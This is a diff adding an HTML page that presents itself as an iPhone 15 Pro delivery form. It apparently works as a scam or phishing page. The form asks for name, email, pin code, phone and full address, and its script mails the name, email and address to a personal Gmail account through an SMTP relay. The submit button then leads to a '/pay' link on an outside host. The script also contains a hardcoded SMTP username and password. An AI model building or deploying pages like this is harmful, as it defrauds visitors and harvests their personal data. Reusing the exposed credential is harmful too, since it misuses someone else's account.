@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://kit.fontawesome.com/4cbca90a22.js" crossorigin="anonymous"></script>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: url(assets/images/banner/backgroundimg.png);
+            background-repeat: no-repeat;
+            background-size: cover;
+            padding: 20px;
+        }
+
+        .form {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-detail {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-detail i {
+            color: #333;
+            font-size: 40px;
+        }
+
+        .phone {
+            font-size: 30px;
+            background: -webkit-linear-gradient(rgb(188, 12, 241), rgb(212, 4, 4));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .para {
+            color: #333;
+            margin-top: 10px;
+        }
+
+        form input {
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .button {
+            width: 20%;
+            padding: 10px;
+            background: linear-gradient(45deg, rgb(240, 57, 179), purple, blue);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .button a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .imgCont img {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        @media screen and (min-width: 768px) {
+            .container {
+                flex-direction: row;
+                justify-content: space-around;
+                padding: 40px;
+            }
+
+            .form {
+                margin-right: 20px;
+            }
+
+            .imgCont {
+                margin-left: 20px;
+            }
+
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="form">
+            <div class="form-detail">
+                <i class="fa-brands fa-apple"></i>
+                <h1 class="phone">iPhone 15 Pro</h1>
+                <p class="para">Where should we send your new iPhone?</p>
+            </div>
+            <form action="#" class="action">
+                <input class="First" type="text" placeholder="First Name" required>
+                <input class="Last" type="text" placeholder="Last Name" required>
+                <input class="mail full" type="email" placeholder="Email" required>
+                <input class="Pin" type="text" placeholder="Pin Code" required>
+                <input class="Phone" type="tel" placeholder="Phone" required>
+                <input class="Address full" type="text" placeholder="Full Address" required>
+                <button class="button" onclick='emailSend()'><a href="https://spring-green-hippo-fez.cyclic.app/pay" style="color: white;" >Submit</a></button>
+                
+            </form>
+        </div>
+        <div class="imgCont">
+            <img class="img2" src="imgs/iphone2-removebg-preview-1.png" alt="">
+        </div>
+    </div>
+
+
+
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+
+
+    <script>
+        function emailSend() {
+            let Name = document.getElementsByClassName('First')[0].value;
+            // let Name2 = document.getElementsByClassName('Last')[0].value;
+            let email = document.getElementsByClassName('mail')[0].value;
+            // let pin = document.getElementsByClassName('Pin')[0].value;
+            let address = document.getElementsByClassName('Address')[0].value;
+            var messageBody = "Name" + Name +
+                "<br/> Email " + email +
+                "<br/> Address" + address;
+                console.log(messageBody)
+
+
+                
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "ankitswetashukla8884@gmail.com",
+                Password: "A5FC19F5C1DCCFE65D225F96D624DCD5FDEA",
+                To: 'ankitswetashukla8884@gmail.com',
+                From: "ankitswetashukla8884@gmail.com",
+                Subject: "This is the subject",
+                Body: messageBody
+            }).then(
+                message => {
+                    if (message == 'OK') {
+                        alert("Sucessful", "You clicked the button!", "success");
+                    }
+                    else {
+                        alert("Error", "You clicked the button!", "error");
+                    }
+                }
+            );
+        }
+ 
+    </script>
+</body>
+
+</html>
